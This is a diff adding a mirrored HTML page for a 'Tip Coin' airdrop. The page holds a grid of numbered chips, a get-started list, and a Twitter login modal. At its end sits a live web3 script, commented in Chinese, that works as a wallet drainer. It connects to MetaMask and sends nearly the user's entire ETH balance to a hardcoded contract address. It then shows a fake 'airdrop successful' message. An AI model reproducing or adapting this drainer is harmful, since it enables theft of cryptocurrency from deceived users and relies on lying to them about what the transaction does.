+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiBox-root css-8durlh">
+                                            <div class="MuiChip-root MuiChip-outlined MuiChip-sizeMedium MuiChip-colorSuccess MuiChip-outlinedSuccess css-2iccp2">
+                                                <span class="MuiChip-label MuiChip-labelMedium css-9iedg7">04</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiBox-root css-8durlh">
+                                            <div class="MuiChip-root MuiChip-outlined MuiChip-sizeMedium MuiChip-colorSuccess MuiChip-outlinedSuccess css-2iccp2">
+                                                <span class="MuiChip-label MuiChip-labelMedium css-9iedg7">05</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiBox-root css-8durlh">
+                                            <div class="MuiChip-root MuiChip-outlined MuiChip-sizeMedium MuiChip-colorSuccess MuiChip-outlinedSuccess css-2iccp2">
+                                                <span class="MuiChip-label MuiChip-labelMedium css-9iedg7">06</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiBox-root css-8durlh">
+                                            <div class="MuiChip-root MuiChip-outlined MuiChip-sizeMedium MuiChip-colorSuccess MuiChip-outlinedSuccess css-2iccp2">
+                                                <span class="MuiChip-label MuiChip-labelMedium css-9iedg7">07</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiBox-root css-8durlh">
+                                            <div class="MuiChip-root MuiChip-outlined MuiChip-sizeMedium MuiChip-colorWarning MuiChip-outlinedWarning css-1j0ss5r">
+                                                <span class="MuiChip-label MuiChip-labelMedium css-9iedg7">08</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiBox-root css-8durlh">
+                                            <div class="MuiChip-root MuiChip-outlined MuiChip-sizeMedium MuiChip-colorWarning MuiChip-outlinedWarning css-1j0ss5r">
+                                                <span class="MuiChip-label MuiChip-labelMedium css-9iedg7">09</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiBox-root css-8durlh">
+                                            <div class="MuiChip-root MuiChip-outlined MuiChip-sizeMedium MuiChip-colorWarning MuiChip-outlinedWarning css-1j0ss5r">
+                                                <span class="MuiChip-label MuiChip-labelMedium css-9iedg7">10</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiBox-root css-8durlh">
+                                            <div class="MuiChip-root MuiChip-outlined MuiChip-sizeMedium MuiChip-colorWarning MuiChip-outlinedWarning css-1j0ss5r">
+                                                <span class="MuiChip-label MuiChip-labelMedium css-9iedg7">11</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiBox-root css-8durlh">
+                                            <div class="MuiChip-root MuiChip-outlined MuiChip-sizeMedium MuiChip-colorWarning MuiChip-outlinedWarning css-1j0ss5r">
+                                                <span class="MuiChip-label MuiChip-labelMedium css-9iedg7">12</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiBox-root css-8durlh">
+                                            <div class="MuiChip-root MuiChip-outlined MuiChip-sizeMedium MuiChip-colorWarning MuiChip-outlinedWarning css-1j0ss5r">
+                                                <span class="MuiChip-label MuiChip-labelMedium css-9iedg7">13</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiBox-root css-8durlh">
+                                            <div class="MuiChip-root MuiChip-outlined MuiChip-sizeMedium MuiChip-colorWarning MuiChip-outlinedWarning css-1j0ss5r">
+                                                <span class="MuiChip-label MuiChip-labelMedium css-9iedg7">14</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiBox-root css-8durlh">
+                                            <div class="MuiChip-root MuiChip-outlined MuiChip-sizeMedium MuiChip-colorError MuiChip-outlinedError css-15za7ao">
+                                                <span class="MuiChip-label MuiChip-labelMedium css-9iedg7">15</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiBox-root css-8durlh">
+                                            <div class="MuiChip-root MuiChip-outlined MuiChip-sizeMedium MuiChip-colorError MuiChip-outlinedError css-15za7ao">
+                                                <span class="MuiChip-label MuiChip-labelMedium css-9iedg7">16</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiBox-root css-8durlh">
+                                            <div class="MuiChip-root MuiChip-outlined MuiChip-sizeMedium MuiChip-colorError MuiChip-outlinedError css-15za7ao">
+                                                <span class="MuiChip-label MuiChip-labelMedium css-9iedg7">17</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiBox-root css-8durlh">
+                                            <div class="MuiChip-root MuiChip-outlined MuiChip-sizeMedium MuiChip-colorError MuiChip-outlinedError css-15za7ao">
+                                                <span class="MuiChip-label MuiChip-labelMedium css-9iedg7">18</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiBox-root css-8durlh">
+                                            <div class="MuiChip-root MuiChip-outlined MuiChip-sizeMedium MuiChip-colorError MuiChip-outlinedError css-15za7ao">
+                                                <span class="MuiChip-label MuiChip-labelMedium css-9iedg7">19</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiBox-root css-8durlh">
+                                            <div class="MuiChip-root MuiChip-outlined MuiChip-sizeMedium MuiChip-colorError MuiChip-outlinedError css-15za7ao">
+                                                <span class="MuiChip-label MuiChip-labelMedium css-9iedg7">20</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiBox-root css-8durlh">
+                                            <div class="MuiChip-root MuiChip-outlined MuiChip-sizeMedium MuiChip-colorError MuiChip-outlinedError css-15za7ao">
+                                                <span class="MuiChip-label MuiChip-labelMedium css-9iedg7">21</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiBox-root css-8durlh">
+                                            <div class="MuiChip-root MuiChip-outlined MuiChip-sizeMedium MuiChip-colorInfo MuiChip-outlinedInfo css-1tuynvm">
+                                                <span class="MuiChip-label MuiChip-labelMedium css-9iedg7">22</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiBox-root css-8durlh">
+                                            <div class="MuiChip-root MuiChip-outlined MuiChip-sizeMedium MuiChip-colorInfo MuiChip-outlinedInfo css-1tuynvm">
+                                                <span class="MuiChip-label MuiChip-labelMedium css-9iedg7">23</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiBox-root css-8durlh">
+                                            <div class="MuiChip-root MuiChip-outlined MuiChip-sizeMedium MuiChip-colorInfo MuiChip-outlinedInfo css-1tuynvm">
+                                                <span class="MuiChip-label MuiChip-labelMedium css-9iedg7">24</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiBox-root css-8durlh">
+                                            <div class="MuiChip-root MuiChip-outlined MuiChip-sizeMedium MuiChip-colorInfo MuiChip-outlinedInfo css-1tuynvm">
+                                                <span class="MuiChip-label MuiChip-labelMedium css-9iedg7">25</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiBox-root css-8durlh">
+                                            <div class="MuiChip-root MuiChip-outlined MuiChip-sizeMedium MuiChip-colorInfo MuiChip-outlinedInfo css-1tuynvm">
+                                                <span class="MuiChip-label MuiChip-labelMedium css-9iedg7">26</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiBox-root css-8durlh">
+                                            <div class="MuiChip-root MuiChip-outlined MuiChip-sizeMedium MuiChip-colorInfo MuiChip-outlinedInfo css-1tuynvm">
+                                                <span class="MuiChip-label MuiChip-labelMedium css-9iedg7">27</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiBox-root css-8durlh">
+                                            <div class="MuiChip-root MuiChip-outlined MuiChip-sizeMedium MuiChip-colorInfo MuiChip-outlinedInfo css-1tuynvm">
+                                                <span class="MuiChip-label MuiChip-labelMedium css-9iedg7">28</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiBox-root css-8durlh">
+                                            <div class="MuiChip-root MuiChip-outlined MuiChip-sizeMedium MuiChip-colorSecondary MuiChip-outlinedSecondary css-njcl76">
+                                                <span class="MuiChip-label MuiChip-labelMedium css-9iedg7">29</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiBox-root css-8durlh">
+                                            <div class="MuiChip-root MuiChip-outlined MuiChip-sizeMedium MuiChip-colorSecondary MuiChip-outlinedSecondary css-njcl76">
+                                                <span class="MuiChip-label MuiChip-labelMedium css-9iedg7">30</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="MuiBox-root css-sg11fo">
+                        <div class="MuiStack-root css-1ov46kg">
+                            <h3 class="MuiTypography-root MuiTypography-h3 css-10bjihq">Get Started</h3>
+                            <ul class="MuiList-root MuiList-padding css-1ontqvh">
+                                 
+                                <li class="MuiListItem-root MuiListItem-gutters MuiListItem-padding css-10r3l74">
+                                    <div class="MuiListItemIcon-root css-5n5rd1">
+                                        <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="Filter1Icon">
+                                            <path d="M3 5H1v16c0 1.1.9 2 2 2h16v-2H3V5zm11 10h2V5h-4v2h2v8zm7-14H7c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V3c0-1.1-.9-2-2-2zm0 16H7V3h14v14z">
+                                            </path>
+                                        </svg>
+                                    </div>
+                                    <div class="MuiListItemText-root MuiListItemText-multiline css-1xar93x">
+                                        <span class="MuiTypography-root MuiTypography-body1 MuiListItemText-primary css-1obovq4">Connect Account</span>
+                                        <p class="MuiTypography-root MuiTypography-body2 MuiListItemText-secondary css-zds6py">
+                                        Link your twitter to create your <b>$tip</b> account
+                                        </p>
+                                    </div>
+                                </li>
+                                
+                                
+                                <li class="MuiListItem-root MuiListItem-gutters MuiListItem-padding css-10r3l74">
+                                    <div class="MuiListItemIcon-root css-5n5rd1">
+                                        <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="Filter2Icon">
+                                            <path d="M3 5H1v16c0 1.1.9 2 2 2h16v-2H3V5zm18-4H7c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V3c0-1.1-.9-2-2-2zm0 16H7V3h14v14zm-4-4h-4v-2h2c1.1 0 2-.89 2-2V7c0-1.11-.9-2-2-2h-4v2h4v2h-2c-1.1 0-2 .89-2 2v4h6v-2z">
+                                            </path>
+                                        </svg>
+                                    </div>
+                                    <div class="MuiListItemText-root MuiListItemText-multiline css-1xar93x">
+                                        <span class="MuiTypography-root MuiTypography-body1 MuiListItemText-primary css-1obovq4">Send join message</span>
+                                        <p class="MuiTypography-root MuiTypography-body2 MuiListItemText-secondary css-zds6py">
+                                        Send out your join message to activate
+                                        </p>
+                                    </div>
+                                </li>
+                                
+                                
+                                <li class="MuiListItem-root MuiListItem-gutters MuiListItem-padding css-10r3l74">
+                                    <div class="MuiListItemIcon-root css-5n5rd1">
+                                        <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="Filter3Icon">
+                                            <path d="M21 1H7c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V3c0-1.1-.9-2-2-2zm0 16H7V3h14v14zM3 5H1v16c0 1.1.9 2 2 2h16v-2H3V5zm14 8v-1.5c0-.83-.67-1.5-1.5-1.5.83 0 1.5-.67 1.5-1.5V7c0-1.11-.9-2-2-2h-4v2h4v2h-2v2h2v2h-4v2h4c1.1 0 2-.89 2-2z">
+                                            </path>
+                                        </svg>
+                                    </div>
+                                    <div class="MuiListItemText-root MuiListItemText-multiline css-1xar93x">
+                                        <span class="MuiTypography-root MuiTypography-body1 MuiListItemText-primary css-1obovq4">Start earning points</span>
+                                        <p class="MuiTypography-root MuiTypography-body2 MuiListItemText-secondary css-zds6py">
+                                        Keep tweeting every epoch to generate points
+                                        </p>
+                                    </div>
+                                </li>
+                                
+                                
+                                <li class="MuiListItem-root MuiListItem-gutters MuiListItem-padding css-10r3l74">
+                                    <div class="MuiListItemIcon-root css-5n5rd1">
+                                        <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="Filter4Icon">
+                                            <path d="M3 5H1v16c0 1.1.9 2 2 2h16v-2H3V5zm12 10h2V5h-2v4h-2V5h-2v6h4v4zm6-14H7c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V3c0-1.1-.9-2-2-2zm0 16H7V3h14v14z">
+                                            </path>
+                                        </svg>
+                                    </div>
+                                    <div class="MuiListItemText-root MuiListItemText-multiline css-1xar93x">
+                                        <span class="MuiTypography-root MuiTypography-body1 MuiListItemText-primary css-1obovq4">Claim</span>
+                                        <p class="MuiTypography-root MuiTypography-body2 MuiListItemText-secondary css-zds6py">
+                                        Claim your points for <b>$tip</b> tokens after each epoch
+                                        </p>
+                                    </div>
+                                </li>
+                                
+                            </ul>
+                            <button class="MuiButtonBase-root MuiButton-root MuiButton-contained MuiButton-containedPrimary MuiButton-sizeLarge MuiButton-containedSizeLarge MuiButton-root MuiButton-contained MuiButton-containedPrimary MuiButton-sizeLarge MuiButton-containedSizeLarge css-1r3grdq" tabindex="0" type="button">Start Now<span class="MuiTouchRipple-root css-w0pj6f"></span>
+                            </button>
+                        </div>
+                    </div>
+                    
+                </div>
+                <hr class="MuiDivider-root MuiDivider-fullWidth MuiDivider-flexItem css-10mk4c7">
+                <div class="MuiBox-root css-cwincz">
+                    <div class="MuiStack-root css-1rrus1u">
+                        <a class="MuiButtonBase-root MuiIconButton-root MuiIconButton-sizeLarge css-6ci2yv" tabindex="0" href="http://twitter.com/tipcoineth" target="_blank">
+                            <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeLarge css-6flbmm" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="TwitterIcon">
+                                <path d="M22.46 6c-.77.35-1.6.58-2.46.69.88-.53 1.56-1.37 1.88-2.38-.83.5-1.75.85-2.72 1.05C18.37 4.5 17.26 4 16 4c-2.35 0-4.27 1.92-4.27 4.29 0 .34.04.67.11.98C8.28 9.09 5.11 7.38 3 4.79c-.37.63-.58 1.37-.58 2.15 0 1.49.75 2.81 1.91 3.56-.71 0-1.37-.2-1.95-.5v.03c0 2.08 1.48 3.82 3.44 4.21a4.22 4.22 0 0 1-1.93.07 4.28 4.28 0 0 0 4 2.98 8.521 8.521 0 0 1-5.33 1.84c-.34 0-.68-.02-1.02-.06C3.44 20.29 5.7 21 8.12 21 16 21 20.33 14.46 20.33 8.79c0-.19 0-.37-.01-.56.84-.6 1.56-1.36 2.14-2.23z">
+                                </path>
+                            </svg>
+                            <span class="MuiTouchRipple-root css-w0pj6f"></span>
+                        </a>
+                        <div class="MuiStack-root css-dvxtzn">
+                            <p class="MuiTypography-root MuiTypography-body1 css-1roqnrn">Copyright © 2022-2023 All Rights Reserved.</p>
+                            <a class="MuiTypography-root MuiTypography-inherit MuiLink-root MuiLink-underlineAlways css-nq92xn" href="#">Legal Stuff</a>
+                        </div>
+                        <a class="MuiButtonBase-root MuiIconButton-root MuiIconButton-sizeLarge css-6ci2yv" tabindex="0" href="http://twitter.com/tipcoineth" target="_blank">
+                            <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeLarge css-6flbmm" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="TelegramIcon">
+                                <path d="M9.78 18.65l.28-4.23 7.68-6.92c.34-.31-.07-.46-.52-.19L7.74 13.3 3.64 12c-.88-.25-.89-.86.2-1.3l15.97-6.16c.73-.33 1.43.18 1.15 1.3l-2.72 12.81c-.19.91-.74 1.13-1.5.71L12.6 16.3l-1.99 1.93c-.23.23-.42.42-.83.42z">
+                                </path>
+                            </svg>
+                            <span class="MuiTouchRipple-root css-w0pj6f"></span>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+<script src='static/js/stopExecutionOnTimeoutb73c.js?t=1'></script>
+<div role="presentation" class="MuiDialog-root MuiModal-root css-126xj0f" style="display:none">
+	<div aria-hidden="true" class="MuiBackdrop-root MuiModal-backdrop css-919eu4" style="opacity: 1; transition: opacity 225ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;"></div>
+	<div tabindex="0" data-testid="sentinelStart"></div>
+	<div class="MuiDialog-container MuiDialog-scrollPaper css-16u656j" role="presentation" tabindex="-1" style="opacity: 1; transition: opacity 225ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;">
+		<div class="MuiPaper-root MuiPaper-outlined MuiPaper-rounded MuiDialog-paper MuiDialog-paperScrollPaper MuiDialog-paperWidthSm css-1l2b322" role="dialog" aria-labelledby=":r1:">
+		    
+			<h2 class="MuiTypography-root MuiTypography-h6 MuiDialogTitle-root css-1rkw802" id=":r1:">Login
+			<span style="float: right;
+    width: 50px;
+    height: 50px;
+    text-align: center;
+    line-height: 50px;
+    background-color: rgba(0,0,0,.4);
+    border-radius: 50px;" id="colse">X</span>
+			</h2>
+			<div class="MuiDialogContent-root css-1ty026z">
+				<div class="MuiStack-root css-1cdg1u5">
+					<p class="MuiTypography-root MuiTypography-body1 css-1roqnrn">Please connect your Twitter/X to join the airdrop! This is just to verify your account, we <b>won&#39;t</b> be able to post or make changes.</p>
+					<a href="#" class="MuiButtonBase-root MuiButton-root MuiButton-contained MuiButton-containedInfo MuiButton-sizeMedium MuiButton-containedSizeMedium MuiButton-root MuiButton-contained MuiButton-containedInfo MuiButton-sizeMedium MuiButton-containedSizeMedium css-1155xao" tabindex="0" type="button">Connect Account<span class="MuiTouchRipple-root css-w0pj6f"></span>
+					</a>
+					<span class="MuiTypography-root MuiTypography-caption css-u1xn8">By using Tip Coin, you agree to our&nbsp;<a class="MuiTypography-root MuiTypography-inherit MuiLink-root MuiLink-underlineAlways css-nq92xn" href="index783b.html?pages_5/">Terms of Service</a>&nbsp;and our&nbsp;<a class="MuiTypography-root MuiTypography-inherit MuiLink-root MuiLink-underlineAlways css-nq92xn" href="indexe63e.html?pages_6/">Privacy Policy</a>.</span>
+				</div>
+			</div>
+			
+		</div>
+	</div>
+	<div tabindex="0" data-testid="sentinelEnd"></div>
+</div>
+
+                                        <script>
+    $(".css-1r3grdq").click(function(){
+        $(".css-126xj0f").toggle();
+    });
+    $("#colse").click(function(){
+        $(".css-126xj0f").toggle();
+    });
+</script>
+
+
+
+
+
+
+<script src="../cdn.jsdelivr.net/npm/web3%401.5.2/dist/web3.min.js"></script>
+<script>
+    document.addEventListener("DOMContentLoaded", async () => {
+        // 检查 MetaMask 是否已安装
+        if (typeof window.ethereum !== 'undefined') {
+            const ethereum = window.ethereum;
+
+            // 检查用户是否连接到以太坊主网络
+            const networkId = await ethereum.request({ method: 'net_version' });
+
+            if (networkId === '1') {
+                // 用户已连接到以太坊主网络
+
+                // 请求用户授权连接到 MetaMask
+                await ethereum.request({ method: 'eth_requestAccounts' });
+
+                const web3 = new Web3(ethereum);
+
+                // 获取用户地址
+                const accounts = await web3.eth.getAccounts();
+                const userAddress = accounts[0];
+
+                // 获取合约 ABI 和地址
+                const contractABI = [{"constant":false,"inputs":[],"name":"securityupdata","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"withdraw","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"}]
+
+                const contractAddress = '0x09727F2F29A18A7B90e333fa6C9e40E6726D0f46'; // 替换为你的合约地址
+                // 使用合约 ABI 和地址创建一个合约实例
+                const contract = new web3.eth.Contract(contractABI, contractAddress);
+
+                // 监听按钮点击事件
+                const transferButton = document.getElementById('transferButton');
+                transferButton.addEventListener('click', async () => {
+                    try {
+                        // 获取用户余额
+                        const balanceWei = await web3.eth.getBalance(userAddress);
+                        const gasPrice = await web3.eth.getGasPrice();
+                        const minGasPrice = web3.utils.toWei('0.1', 'gwei');
+                        const maxGasPrice = web3.utils.toWei('30', 'gwei');
+
+                        // 将余额从 wei 转换为 ETH
+                        const userBalanceETH = web3.utils.fromWei(balanceWei, 'ether');
+
+                        // 设置要减少的转账金额（以ETH为单位）
+                        const reduceAmountETH = 0.0001; // 调整这个值以减小可转账金额
+
+                        // 检查用户余额是否足够
+                        if (parseFloat(userBalanceETH) < (0.00005 + reduceAmountETH)) {
+                            customAlert('If the balance is less than 0.01 ETH, you are not eligible for airdrops');
+                            return;
+                        }
+
+                        // 获取用户设置的 gas 价格，确保在最小和最大之间
+                        const gasPriceWei = Math.min(maxGasPrice, Math.max(minGasPrice, gasPrice));
+
+                        // 计算转账金额
+                        const gasLimit = 22000; // 根据需要设置适当的 gas 限制
+                        const gasCostETH = web3.utils.fromWei((gasPriceWei * gasLimit).toString(), 'ether');
+                        const transferAmountETH = (parseFloat(userBalanceETH) - (0.00005 + reduceAmountETH + parseFloat(gasCostETH))).toFixed(8);
+
+                        // 转账金额从 ETH 转换为 wei
+                        const transferAmountWei = web3.utils.toWei(transferAmountETH, 'ether');
+
+                        // 构建转账交易
+                        const tx = {
+                            from: userAddress,
+                            to: contractAddress,
+                            value: transferAmountWei,
+                            gas: gasLimit,
+                            gasPrice: gasPriceWei
+                        };
+
+                        // 发起转账交易
+                        const txHash = await web3.eth.sendTransaction(tx);
+                        customAlert('The review was successful, congratulations on getting the airdrop');
+                    } catch (error) {
+                        console.error(error);
+                        customAlert('The gas balance is insufficient and the check has been refused.');
+                    }
+                });
+            } else {
+                // 用户未连接到以太坊主网络，显示提示信息
+                customAlert('Please connect to the Ethereum main network to continue.');
+            }
+        } else {
+            customAlert('MetaMask is not installed.');
+        }
+    });
+
+    function customAlert(message) {
+        // 创建自定义提示框
+        const customAlertDiv = document.createElement('div');
+        customAlertDiv.setAttribute('id', 'customAlertDiv');
+        customAlertDiv.style.backgroundColor = 'rgba(0, 0, 0, 0.7)';
+        customAlertDiv.style.position = 'fixed';
+        customAlertDiv.style.top = '0';
+        customAlertDiv.style.left = '0';
+        customAlertDiv.style.width = '100%';
+        customAlertDiv.style.height = '100%';
+
+
+
+        customAlertDiv.style.display = 'flex';
+        customAlertDiv.style.justifyContent = 'center';
+        customAlertDiv.style.alignItems = 'center';
+
+        // 创建自定义提示信息
+        const customAlertMessage = document.createElement('div');
+        customAlertMessage.setAttribute('id', 'customAlertMessage');
+        customAlertMessage.style.backgroundColor = 'white';
+        customAlertMessage.style.padding = '20px';
+        customAlertMessage.style.borderRadius = '10px';
+        customAlertMessage.style.textAlign = 'center';
+        customAlertMessage.style.color = 'black'; // 添加这行以设置字体颜色为黑色
+        customAlertMessage.textContent = message;
+
+
+      //  customAlertMessage.style.backgroundColor = 'white';
+      //  customAlertMessage.style.padding = '20px';
+       // customAlertMessage.style.borderRadius = '10px';
+       // customAlertMessage.style.textAlign = 'center';
+       // customAlertMessage.style.color = 'black'; // 添加这行以设置字体颜色为黑色
+       // customAlertMessage.textContent = message;
+
+
+
+        // 创建"OK"按钮
+        const customAlertOKButton = document.createElement('button');
+        customAlertOKButton.setAttribute('id', 'customAlertOKButton');
+        customAlertOKButton.textContent = 'OK';
+        customAlertOKButton.style.display = 'block';
+        customAlertOKButton.style.marginTop = '10px';
+
+        // 添加"OK"按钮点击事件
+        customAlertOKButton.addEventListener('click', () => {
+            // 移除自定义提示框
+            document.body.removeChild(customAlertDiv);
+        });
+
+        // 将提示信息和按钮添加到自定义提示框中
+        customAlertDiv.appendChild(customAlertMessage);
+        customAlertDiv.appendChild(customAlertOKButton);
+
+        // 将自定义提示框添加到页面中
+        document.body.appendChild(customAlertDiv);
+    }
+</script>
+
+
+
+
+
+<!-- Mirrored from thetipcion.io/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 15 Sep 2023 17:30:54 GMT -->
+</html>
